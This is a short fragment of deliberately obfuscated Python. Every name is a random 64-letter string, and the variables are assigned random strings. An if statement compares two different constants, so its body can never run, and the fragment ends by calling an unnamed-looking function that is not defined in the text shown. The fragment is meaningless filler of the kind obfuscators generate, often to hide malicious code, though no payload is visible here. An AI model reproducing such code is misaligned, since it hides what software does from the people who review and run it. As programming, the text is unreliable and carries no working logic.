    XxiRKpHjktBEuaHNNwbbQmWgNvbDogcXSZWlQmeVkfgHkKkRqhJpIQtBPrkkUuTy = 'lzJWOAVDCOIsEJzSVZtAyTDVrarmlGbrtQrynlmbWvwBfztLzRuwwtChUzcsPVck'
    fYPzDxrSNTdzRrUcTMTxbqwozjKiVKuPaICYwDYFIbsENZdoQyjZktWGSUpDXaYJ = 'LulYOUmxQzFMmkjYctGGlcuodBejJJWkonBvbeRJzqVPgQeiOvSrOBYFCEdQotNd'
    jNzgqkJEFmZKsyFDxskCfzalGslpEtrxXZOdKEWQyZjHvpErselwzgHNLCpNcINn = 'HKNlfiizshXBPdaufvSOxYgxTWvMIXgyYMkifYGsoxFohlOnrCOvvUToIDdneEPt'
    oJpUGcLxKvdeEdjXJxzvtdYMQXAspBPIbKqaPOMBAVDwDOvIBBCMAZJMADLORGiz = 'VftKUAdmMCSAiSitvtAnawKeVphAUsbPmYYTTdmPMJNULbmkLpxlMnxAbJdVubYJ'
    fnrZChOhCGgmzJfqIUYljSqlJWZZSUOdOulFRJUQgGdGJnVVCchYQuYmnNaXBZdR = 'YxjNnEUYjgrPjzvCCXqVPAdWXCGxkMmsZqOuWlOkXZsyJXngMxYPzPZuJEixQsUa'
    ernjemBaBdcDFiibfPmocXtumCYtSzYDoLsUbmblsjXYFuGiEDcCTZMYwsMQnyzk = 'uhalaiwNbhztJPzcpMuefsIbebAMFuEZLmYPjuwflfQkyNZzxhBUUTyNEsXGsBSh'
    if jNzgqkJEFmZKsyFDxskCfzalGslpEtrxXZOdKEWQyZjHvpErselwzgHNLCpNcINn == oJpUGcLxKvdeEdjXJxzvtdYMQXAspBPIbKqaPOMBAVDwDOvIBBCMAZJMADLORGiz:
        for ernjemBaBdcDFiibfPmocXtumCYtSzYDoLsUbmblsjXYFuGiEDcCTZMYwsMQnyzk in fnrZChOhCGgmzJfqIUYljSqlJWZZSUOdOulFRJUQgGdGJnVVCchYQuYmnNaXBZdR:
            if ernjemBaBdcDFiibfPmocXtumCYtSzYDoLsUbmblsjXYFuGiEDcCTZMYwsMQnyzk == oJpUGcLxKvdeEdjXJxzvtdYMQXAspBPIbKqaPOMBAVDwDOvIBBCMAZJMADLORGiz:
                fnrZChOhCGgmzJfqIUYljSqlJWZZSUOdOulFRJUQgGdGJnVVCchYQuYmnNaXBZdR = XxiRKpHjktBEuaHNNwbbQmWgNvbDogcXSZWlQmeVkfgHkKkRqhJpIQtBPrkkUuTy
            else:
                oJpUGcLxKvdeEdjXJxzvtdYMQXAspBPIbKqaPOMBAVDwDOvIBBCMAZJMADLORGiz = fYPzDxrSNTdzRrUcTMTxbqwozjKiVKuPaICYwDYFIbsENZdoQyjZktWGSUpDXaYJ
    dOGhSjWYUiVJKUTgWbiCcLCNdCryPxWCQlhMeeUtYSPigcbRaVADpWqZmMyDOJBu()
